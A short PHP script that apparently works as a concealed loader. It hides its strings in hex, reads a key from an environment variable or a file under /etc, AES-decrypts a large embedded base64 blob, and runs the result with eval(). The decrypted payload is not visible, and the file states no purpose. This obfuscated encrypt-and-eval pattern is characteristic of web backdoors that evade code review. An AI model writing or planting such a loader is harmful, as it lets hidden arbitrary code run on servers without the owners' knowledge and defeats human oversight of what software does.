<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('cTPUXAYYb0Rm8rdpz25yyg==');

$c=base64_decode(

'B4IkF2LLTWvnchz4qr2hJRTUdYkpcoIx/YtmJWHypVS3g+roH3DbpSpD87n6Eovrcj7bY/vXkDo1' .
'Y2bn8iF2+EsKtlZ+AlwfYzitz1wk3Uwf6K3iwxpD1V6bqQ696GYDD/DAo+726Pgl4xe6iNUtBI+X' .
'wRqIqUDLSv145/1GjvQmL3IDsx9akyJp/OoAZojT9Q1vOA3vpcQ+vEE4rkuPquUM0tUpmipruknt' .
'YquU6wUk9L3XBBS1r+6lJraimHHNzRDgaKKCK1giu0i2xmTbfpICBp6rKT9/a4QTSH1sf3XkYI8Y' .
'jrcr3RPXwalnNnm+JjryiDD8p+HsB7/G+pw5jathqAHgQvkvo4P21PEky06vjQfzRyNU0F9e1tZZ' .
'kEbM4ZfwuyVPvByDycrxPSk+TmtOh+z5oJadsgJFVYI+v7cIfPWMZe8G/O7z89hkB0UwxZR1Icl1' .
'AS8qZR7jnkUWGwfvuTru2OaWm1BW/8FCI6bb8dD19Bwgk4ZVgLOdBj/6fC5cFiM5t3iqFH833c0C' .
'9obKhdOtk5Wns/USAwKXCpxQEfsIcOlhd8lxW/OYaYMS+1VVJLKdUJYZmWNYgVMEZbcjNsdsHO2H' .
'Zw6t+YwrCgWcdsjr8DhZMPro4Tnqf6B13DfABb7NqAafmsVmiPOitpwm15agYsi24FpvqzGCv6LO' .
'WpfkdMJGkRlQGpjm8zPS5hLFsoPkrWUi+rxIOg9gd3vRzRfzXHM+HFeJ7WDg1qD5lllLho3A/cOb' .
'avuJOYTKWbjTaO2LlFVmq7DHRCELDim11Mx+6rVm2ux5As+LRxP7FMxftuwnHfUTcAJtY5t/tcyy' .
'RTWQwdjr2sIG+zawdOORt42x0ne0OmIZ5frSK58myn+sLLBR5U/jFxp/oHJcUwy+cDLGRoyYQc5v' .
'AEDg6lLsvde5dGs0aQaMysDgoQ1GRN+7Y8pKPcSs3i1MKMIVOmP53GSmbSETQVbIwijhqGg+onjU' .
'gUT2roHVSyISRS1cPegq8wfvVzec+2SxQ9hfrCXv92tqs2WqEuWAgK9wrRyuxO3NuC8NOUpy8Uto' .
'vBl3Uy45sqJ1woggijqyxJoJnwMRWm9DpMWk5/ppkedUdoE+da+j1Ztv6mPcMs+zEaIBlIZCKIWx' .
'Djhosf/JpbRdGbVSkcKN+Wg2sraECGA+UsANMBCPFLMjuofo9TZGC/UyVlrLORDviigS2ZfBdCi9' .
'8xFUUsB5noWPuXAFwwEZdHqjId6RdmXvNB3gaqgyMdNGLD7lOVWiCawRJfkXttEbFMFENNPe1788' .
'rREuP8y2Q+gkLbzGUTONElZm3MEwwz4pA7ir9qlI2HJbY6ZndqQzEag0hHQdwyGEM7/DKqcK/g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

